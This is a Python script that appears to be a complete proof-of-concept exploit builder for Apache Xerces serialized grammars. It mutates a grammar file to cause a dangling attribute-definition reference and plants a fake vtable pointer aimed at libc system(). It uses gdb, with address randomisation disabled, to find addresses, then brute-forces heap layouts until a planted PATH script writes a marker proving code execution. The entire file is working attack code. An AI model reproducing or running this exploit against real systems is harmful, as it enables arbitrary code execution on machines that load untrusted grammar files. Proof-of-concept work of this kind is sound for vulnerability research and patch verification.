#!/usr/bin/env python3
import argparse
import os
import platform
import re
import shutil
import stat
import struct
import subprocess
from pathlib import Path

ATTR_OLD = "attr1111111".encode("utf-16le")
ATTR_NEW = "attr0000000".encode("utf-16le")
LONG_QNAME = ("L" * 48).encode("utf-16le")
ATT_WILDCARD_REF_OFF = 0x57C
DANGLING_ATTDEF_ID = 15
BAD_VPTR = 0x4141414141414141
FIRST_VTABLE_DELTA = 0x10
LAST_VTABLE_DELTA = 0x48


def patch_duplicate_key(data: bytearray) -> None:
    off = data.find(ATTR_OLD)
    if off == -1:
        raise SystemExit("could not find attr1111111 in serialized grammar")
    data[off : off + len(ATTR_NEW)] = ATTR_NEW


def find_qname_payload(data: bytearray) -> int:
    hits = []
    start = 0
    while True:
        hit = data.find(LONG_QNAME, start)
        if hit == -1:
            break
        hits.append(hit)
        start = hit + 1

    if len(hits) < 2:
        raise SystemExit("could not find second long QName local payload")

    return hits[1]


def command_len(value: int) -> int:
    bad = set(b"\x00/ \t\r\n;&|<>()$`\\\"'*")
    raw = struct.pack("<Q", value)
    for index, byte in enumerate(raw):
        if byte == 0:
            return index
        if byte in bad:
            return 0
    return len(raw)


def command_bytes(value: int) -> bytes:
    size = command_len(value)
    if size == 0:
        raise ValueError(f"0x{value:x} does not encode as a safe command name")
    return struct.pack("<Q", value)[:size]


def candidate_deltas(this_addr: int) -> list[int]:
    return [
        delta
        for delta in range(FIRST_VTABLE_DELTA, LAST_VTABLE_DELTA + 1, 8)
        if command_len(this_addr + delta) != 0
    ]


def make_input(base_path: Path, out_path: Path, system_addr: int | None, this_addr: int | None, delta: int | None = None) -> tuple[int, int | None]:
    data = bytearray(base_path.read_bytes())
    patch_duplicate_key(data)
    struct.pack_into("<I", data, ATT_WILDCARD_REF_OFF, DANGLING_ATTDEF_ID)

    qname_off = find_qname_payload(data)
    object_off = qname_off + 0x08

    if this_addr is None:
        struct.pack_into("<Q", data, object_off, BAD_VPTR)
        fake_vtable = None
    else:
        if system_addr is None:
            raise SystemExit("system address is required for the final candidate")
        if delta is None:
            raise SystemExit("missing fake vtable delta")
        fake_vtable = this_addr + delta
        struct.pack_into("<Q", data, object_off, fake_vtable)

        # the observed destructor calls through *0x8(%rax), but filling a few
        # adjacent slots keeps the input insensitive to nearby delete variants
        for slot in range(2):
            struct.pack_into("<Q", data, object_off + delta + slot * 8, system_addr)

    out_path.write_bytes(data)
    return qname_off, fake_vtable


def executable_arg(path: Path) -> str:
    raw = str(path)
    if path.is_absolute() or "/" in raw:
        return raw
    return f"./{raw}"


def setarch_cmd(*args: str) -> list[str]:
    return ["setarch", platform.machine(), "-R", *args]


def run_process(trigger: Path, grammar: Path, command_dir: Path, marker: Path) -> subprocess.CompletedProcess[str]:
    env = os.environ.copy()
    env["PATH"] = f"{command_dir}{os.pathsep}{env.get('PATH', '')}"
    return subprocess.run(
        setarch_cmd(executable_arg(trigger), str(grammar)),
        text=True,
        capture_output=True,
        env=env,
    )


def marker_hit(marker: Path) -> bool:
    try:
        return marker.read_text().strip() == "xerces-stock-system-rce"
    except FileNotFoundError:
        return False


def derive_system_addr(trigger: Path) -> int:
    proc = subprocess.run(
        setarch_cmd(
            "gdb",
            "-nx",
            "-batch",
            "-q",
            executable_arg(trigger),
            "-ex",
            "set debuginfod enabled off",
            "-ex",
            "set pagination off",
            "-ex",
            "set confirm off",
            "-ex",
            "set stop-on-solib-events 1",
            "-ex",
            "run /dev/null",
            "-ex",
            "continue",
            "-ex",
            "continue",
            "-ex",
            "p/x (void*)system",
            "-ex",
            "quit",
        ),
        text=True,
        capture_output=True,
    )
    output = proc.stdout + proc.stderr
    match = re.search(r"\$\d+\s+=\s+0x([0-9a-fA-F]+)", output)
    if not match:
        print(output)
        raise SystemExit("could not derive libc system() address with gdb")
    return int(match.group(1), 16)


def probe_this(trigger: Path, grammar: Path, command_dir: Path) -> int:
    env = os.environ.copy()
    env["PATH"] = f"{command_dir}{os.pathsep}{env.get('PATH', '')}"
    proc = subprocess.run(
        setarch_cmd(
            "gdb",
            "-nx",
            "-batch",
            "-q",
            executable_arg(trigger),
            "-ex",
            "set debuginfod enabled off",
            "-ex",
            "set pagination off",
            "-ex",
            "set confirm off",
            "-ex",
            f"run {grammar}",
            "-ex",
            "info registers rip rax rdi",
            "-ex",
            "x/i $rip",
            "-ex",
            "quit",
        ),
        text=True,
        capture_output=True,
        env=env,
    )
    output = proc.stdout + proc.stderr
    match = re.search(r"\brdi\s+0x([0-9a-fA-F]+)", output)
    if not match:
        print(output)
        raise SystemExit("could not extract this/rdi from gdb crash")
    return int(match.group(1), 16)


def write_command(command_dir: Path, fake_vtable: int, marker: Path) -> Path:
    command_dir.mkdir(parents=True, exist_ok=True)
    path = os.fsencode(command_dir) + b"/" + command_bytes(fake_vtable)
    body = b"#!/bin/sh\necho xerces-stock-system-rce > " + os.fsencode(marker) + b"\nexit 42\n"
    with open(path, "wb") as file:
        file.write(body)
    os.chmod(path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR)
    return Path(os.fsdecode(path))


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("base", type=Path, help="valid serialized grammar")
    parser.add_argument("trigger", type=Path, help="plain grammar loader executable")
    parser.add_argument("out", type=Path, help="final mutated grammar output")
    parser.add_argument("--command-dir", type=Path, default=Path("/tmp/xerces-path"))
    parser.add_argument("--marker", type=Path, default=Path("/tmp/xerces_serialized_rce_proof"))
    parser.add_argument("--system-addr", type=lambda x: int(x, 0), default=None)
    args = parser.parse_args()

    args.command_dir.mkdir(parents=True, exist_ok=True)
    args.marker.unlink(missing_ok=True)
    for old in args.command_dir.iterdir():
        if old.is_file() or old.is_symlink():
            old.unlink()
        elif old.is_dir():
            shutil.rmtree(old)

    system_addr = args.system_addr if args.system_addr is not None else derive_system_addr(args.trigger)

    qname_off, _ = make_input(args.base, args.out, system_addr, None)
    observed = probe_this(args.trigger, args.out, args.command_dir)
    print(f"probe this=0x{observed:x}")

    # changing the serialized pointer bytes can move the reclaimed chunk by a
    # page. try nearby stable layouts and keep the first input that proves exec
    this_candidates = [observed, observed + 0x1000, observed - 0x1000, observed + 0x2000]
    for this_addr in this_candidates:
        if this_addr <= 0:
            continue

        for delta in candidate_deltas(this_addr):
            qname_off, fake_vtable = make_input(args.base, args.out, system_addr, this_addr, delta)
            command_path = write_command(args.command_dir, fake_vtable, args.marker)
            args.marker.unlink(missing_ok=True)
            proc = run_process(args.trigger, args.out, args.command_dir, args.marker)
            if marker_hit(args.marker):
                print(f"this=0x{this_addr:x}")
                print(f"system=0x{system_addr:x}")
                print(f"qname_payload=0x{qname_off:x}")
                print(f"fake_vtable=0x{fake_vtable:x}")
                print(f"delta=0x{delta:x}")
                print(f"command_path={command_path}")
                print(f"marker={args.marker}")
                print(f"wrote={args.out}")
                return

            print(f"candidate_failed this=0x{this_addr:x} delta=0x{delta:x} rc={proc.returncode}")

    raise SystemExit("builder did not produce a working input")


if __name__ == "__main__":
    main()
